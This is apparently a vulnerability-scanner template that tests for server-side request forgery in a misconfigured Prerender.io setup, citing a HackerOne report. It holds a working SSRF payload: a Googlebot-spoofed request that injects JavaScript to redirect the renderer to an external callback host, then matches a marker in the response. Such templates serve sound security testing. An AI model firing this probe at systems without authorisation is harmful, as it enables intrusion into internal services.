id: prerender_ssrf

info:
  name: Prerender.io misconfiguration leads to SSRF (https://hackerone.com/reports/1153862)
  author: act1on3
  severity: high

requests:
  - method: GET
    path:
      - '{{BaseURL}}/?javascript=window.prerenderData=window.location.replace%28%22http%3a%2f%2fprerender.xrspg82hl1vkmuki7c70dxpi59bzzo.c.h1act1on3.site%2f%22%29'
    headers:
      User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
    matchers:
      - type: word
        name: ssrf-response-body
        words:
          - '<html><body>cg2mpv18102k5b2i2fsdb9zjigz</body></html>'
        part: body
